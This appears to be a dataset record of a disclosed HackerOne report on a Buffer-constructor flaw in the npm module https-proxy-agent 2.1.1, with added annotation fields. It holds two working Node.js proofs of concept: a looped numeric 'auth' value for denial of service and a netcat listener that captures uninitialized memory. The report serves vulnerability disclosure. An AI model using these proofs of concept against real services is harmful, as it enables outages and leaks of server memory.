{
  "reported_to": "Node.js third-party modules",
  "reported_by": "chalker ",
  "title": "`https-proxy-agent` passes unsanitized options to Buffer(arg), resulting in DoS and uninitialized memory leak",
  "content": "\nI would like to report a Buffer allocation vulnerability in https-proxy-agent.\nIn setups where auth argument is user-controlled, it allows to:\ncause Denial of Service by trivially consuming all the available CPU resources\nextract uninitialized memory chunks from the server on Node.js <8.x.\nModule\nmodule name: https-proxy-agent\nversion: 2.1.1\nnpm page: https://www.npmjs.com/package/https-proxy-agent\nModule Description\nThis module provides an http.Agent implementation that connects to a specified HTTP or HTTPS proxy server, and can be used with the built-in https module.\nModule Stats\n114 304 downloads in the last day\n1 668 955 downloads in the last week\n6 758 891 downloads in the last month\n~81 106 692 estimated downloads per year\nVulnerability\nVulnerability Description\nhttps-proxy-agent passes auth option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'auth' parameter (e.g. JSON).\nThe exact line: https://github.com/TooTallNate/node-https-proxy-agent/blob/2.1.1/index.js#L207\nSteps To Reproduce:\nDoS\nCode 434 Bytes\n1var url = require('url');\n2var https = require('https');\n3var HttpsProxyAgent = require('https-proxy-agent');\n4\n5var proxy = {\n6  protocol: 'http:',\n7  host: \"127.0.0.1\",\n8  port: 8080\n9};\n10\n11setInterval(() => {\n12  proxy.auth = 1e9; // a number as 'auth'\n13  var opts = url.parse('https://example.com/');\n14  var agent = new HttpsProxyAgent(proxy);\n15  opts.agent = agent;\n16  console.time('tick');\n17  https.get(opts);\n18  console.timeEnd('tick');\n19}, 200);\nObserve how this is consuming memory and CPU \u2014 each request takes >1 second in the main thread on my setup.\nUninitialized memory leak\nCode 375 Bytes\n1// listen with: nc -l -p 8080\n2\n3var url = require('url');\n4var https = require('https');\n5var HttpsProxyAgent = require('https-proxy-agent');\n6\n7var proxy = {\n8  protocol: 'http:',\n9  host: \"127.0.0.1\",\n10  port: 8080\n11};\n12\n13proxy.auth = 500; // a number as 'auth'\n14var opts = url.parse('https://example.com/');\n15var agent = new HttpsProxyAgent(proxy);\n16opts.agent = agent;\n17https.get(opts);\nListen with nl -l -p 8080 to see requests.\nExecute on various Node.js versions \u2014 4.x LTS, 6.x LTS, 8.x LTS / 9.x.\nThis leaks uninitialized Buffer memory on Node.js <8.x.\nOn \u22658.x those Buffers (that are using the deprecated API) are zero-filled.\nSupporting Material/References:\nOS: Arch Linux current\nNode.js 9.5.0\nnpm 5.6.0\ngnu-netcat 0.7.1\nWrap up\nI contacted the maintainer to let him know: N\nI opened an issue in the related repository: N\nImpact\nDenial of service\nSensitive data leak (on Node.js <8.0)\n\n",
  "severity": [
    8.2,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1522716540,
  "report_url": "https://hackerone.com/reports/319532",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Set up a proxy configuration with a malicious 'auth' parameter (e.g., a very large number or a specific size to trigger memory leaks)"
    ],
    [
      2,
      "Create an HTTPS request using the vulnerable 'https-proxy-agent' with the malicious proxy configuration"
    ]
  ],
  "vuln_description": "The 'https-proxy-agent' module passes unsanitized 'auth' options directly to the Buffer constructor, which can lead to Denial of Service (DoS) by consuming excessive CPU resources or leaking uninitialized memory chunks in Node.js versions below 8.x.",
  "reason": "The vulnerability involves a straightforward misuse of the Buffer constructor, which is a well-documented pitfall in Node.js. The attack does not require complex interactions or state manipulation, and the issue is relatively easy to identify once the behavior of the Buffer constructor is understood.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}